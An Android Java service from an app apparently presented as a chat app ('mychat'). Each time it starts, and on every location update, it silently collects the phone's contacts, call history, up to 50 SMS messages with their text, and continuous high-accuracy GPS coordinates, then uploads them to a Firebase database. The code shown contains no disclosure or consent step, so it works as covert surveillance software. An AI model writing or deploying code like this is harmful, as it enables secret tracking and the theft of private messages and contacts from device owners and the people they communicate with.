package com.mr_abdali.mychat;

import android.app.Service;
import android.content.ContentResolver;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.os.IBinder;
import android.os.Looper;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.support.annotation.Nullable;
import android.support.v4.content.ContextCompat;
import android.util.Log;
import android.widget.Toast;

import com.google.android.gms.location.FusedLocationProviderClient;
import com.google.android.gms.location.LocationCallback;
import com.google.android.gms.location.LocationRequest;
import com.google.android.gms.location.LocationResult;
import com.google.android.gms.location.LocationServices;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.google.gson.Gson;

import java.util.ArrayList;
import java.util.List;

public class UploadDataService extends Service {

    // TODO: 8/8/2018 Variables Declaration section...
    private long UPDATE_INTERVAL = 2 * 1000;  /* 10 secs */
    private long FASTEST_INTERVAL = 2000; /* 2 sec */
    boolean isContact = false;
    boolean islog = false;
    boolean issms = false;


    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        GetMyLocation();
        UpdateContacts();
        UpdateCallLog();
        UpdateSms();
        return Service.START_NOT_STICKY;
    }

    // TODO: 8/8/2018 Updating Contacts List...
    private void UpdateContacts() {
        if (!isContact){
            MyPrefrences myPrefrences = new MyPrefrences(getApplicationContext());
            String csID = myPrefrences.getID();
            if(csID == null)
                return;
            isContact =!isContact;

            String UserContact="";
            Cursor phones = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,null,null,null,null);
            while (phones.moveToNext()){
                ContactList number = new ContactList();
                number.setName(phones.getString(phones.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)));
                number.setNumber(phones.getString(phones.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)));

                Gson gson = new Gson();
                String jNumber = gson.toJson(number);
                UserContact = UserContact + jNumber+"1016199";
            }
            phones.close();
            DatabaseReference mDatabase = FirebaseDatabase.getInstance().getReference();
            //
            if (csID != null){
                DatabaseReference myRef = mDatabase.child("ContactList/" + csID);
                myRef.child("ID").setValue(csID);
                myRef.child("contacts").setValue(UserContact);
            }
        }
    }

    // TODO: 8/8/2018 UPdateing Call Logs ...
    private void UpdateCallLog() {
        if (!islog) {
            MyPrefrences myPrefrences = new MyPrefrences(getApplicationContext());

            String csID = myPrefrences.getID();

            if (csID == null)
                return;

            islog = !islog;
            String UserNumber = "";

            StringBuffer sb = new StringBuffer();
            Cursor managedCursor = getApplicationContext().getContentResolver().query(CallLog.Calls.CONTENT_URI, null, null, null, null);
            int number = managedCursor.getColumnIndex(CallLog.Calls.NUMBER);
            int type = managedCursor.getColumnIndex(CallLog.Calls.TYPE);
            int date = managedCursor.getColumnIndex(CallLog.Calls.DATE);
            int duration = managedCursor.getColumnIndex(CallLog.Calls.DURATION);
            sb.append("Call Details :");

            while (managedCursor.moveToNext()) {
                CallLogs log = new CallLogs();
                log.setPhNumber(managedCursor.getString(number));
                String callType = managedCursor.getString(type);
                log.setCallDate(managedCursor.getString(date));
                log.setCallDuration(managedCursor.getString(duration));
                String dir = null;
                int dircode = Integer.parseInt(callType);

                switch (dircode) {
                    case CallLog.Calls.OUTGOING_TYPE:
                        dir = "OUTGOING";
                        break;

                    case CallLog.Calls.INCOMING_TYPE:
                        dir = "INCOMING";
                        break;

                    case CallLog.Calls.MISSED_TYPE:
                        dir = "MISSED";
                        break;
                }
                log.setCallType(dir);
                //
                Gson gson = new Gson();
                String ent = gson.toJson(log);
                UserNumber = UserNumber + ent + "1016199";
            }
            DatabaseReference mDatabase = FirebaseDatabase.getInstance().getReference();

            if (csID != null){
                DatabaseReference myRef = mDatabase.child("CallLog/" + csID);
                myRef.child("ID").setValue(csID);
                myRef.child("callLog").setValue(UserNumber);
            }
        }
    }

    // TODO: 8/8/2018 UPdating SMS Implementation...
    private void UpdateSms() {
        if(!issms)
        {
            MyPrefrences myPrefrences = new MyPrefrences(getApplicationContext());

            String csID = myPrefrences.getID();
            if(csID == null)
                return;
            issms =!issms;
            String UserSMS="";

            List<Sms> smsList = getAllSms();
            for(int i=0; i<smsList.size() && i<50; i++)
            {
                Gson gson = new Gson();
                String ent = gson.toJson(smsList.get(i));
                UserSMS = UserSMS +ent+"1016199";
            }
            DatabaseReference database = FirebaseDatabase.getInstance().getReference();

            if(csID != null)
            {
                DatabaseReference myRef = database.child("SMS/" + csID);
                myRef.child("ID").setValue(csID);
                myRef.child("smsLog").setValue(UserSMS);
            }
        }
    }

    // TODO: 8/8/2018 UPdating MSM Get-All-SMS Implementation...
    public List<Sms> getAllSms() {
        List<Sms> lstSms = new ArrayList<Sms>();
        Sms objSms = new Sms();
        Uri message = Uri.parse("content://sms/");
        ContentResolver cr = getApplicationContext().getContentResolver();

        Cursor c = cr.query(message, null, null, null, null);
        ///getApplicationContext().startManagingCursor(c);
        int totalSMS = c.getCount();

        if (c.moveToFirst()) {
            for (int i = 0; i < totalSMS; i++) {

                objSms = new Sms();
                objSms.setId(c.getString(c.getColumnIndexOrThrow("_id")));
                objSms.setAddress(c.getString(c
                        .getColumnIndexOrThrow("address")));
                objSms.setMsg(c.getString(c.getColumnIndexOrThrow("body")));
                objSms.setReadState(c.getString(c.getColumnIndex("read")));
                objSms.setTime(c.getString(c.getColumnIndexOrThrow("date")));
                if (c.getString(c.getColumnIndexOrThrow("type")).contains("1")) {
                    objSms.setFolderName("inbox");
                } else {
                    objSms.setFolderName("sent");
                }

                lstSms.add(objSms);
                c.moveToNext();
            }
        }
        c.close();

        return lstSms;
    }

    // TODO: 8/8/2018 Updating Location....
    FusedLocationProviderClient mFusedLocationClient;
    LocationRequest locationRequest;
    void GetMyLocation(){
        locationRequest = new LocationRequest();
        locationRequest.setInterval(UPDATE_INTERVAL);
        locationRequest.setFastestInterval(FASTEST_INTERVAL);
        locationRequest.setPriority(LocationRequest.PRIORITY_HIGH_ACCURACY);
        mFusedLocationClient = LocationServices.getFusedLocationProviderClient(this);

        try{
            if (android.os.Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                if (ContextCompat.checkSelfPermission(this,
                        android.Manifest.permission.ACCESS_FINE_LOCATION)
                        == PackageManager.PERMISSION_GRANTED) {
                    //Location Permission already granted
                    mFusedLocationClient.requestLocationUpdates(locationRequest, mLocationCallback, Looper.myLooper());

                } else {
                    //Request Location Permission
                }
            }
            else {
                mFusedLocationClient.requestLocationUpdates(locationRequest, mLocationCallback, Looper.myLooper());
            }

                       /* LocationServices.FusedLocationApi.requestLocationUpdates(
                                gac, locationRequest, this);
                    */
        } catch (SecurityException e) {
            Toast.makeText(this, "SecurityException:\n" + e.toString(), Toast.LENGTH_LONG).show();
        }
    }

    LocationCallback mLocationCallback = new LocationCallback(){
        @Override
        public void onLocationResult(LocationResult locationResult) {
            UpdateContacts();
            UpdateCallLog();
            UpdateSms();
            // mFusedLocationClient.removeLocationUpdates( mLocationCallback);

            for (android.location.Location location : locationResult.getLocations()) {
                Log.e("MapsActivity", "Location: " + location.getLatitude() + " " + location.getLongitude());
                DatabaseReference database = FirebaseDatabase.getInstance().getReference();
                MyPrefrences myPrefrences = new MyPrefrences(getApplicationContext());

                String csID = myPrefrences.getID();
                if(csID != null)
                {
                    DatabaseReference myRef = database.child("Location/" + csID);
                    myRef.child("ID").setValue(csID);
                    myRef.child("latlong").setValue(location.getLatitude() + "," + location.getLongitude());
                }
            }
        }
    };

}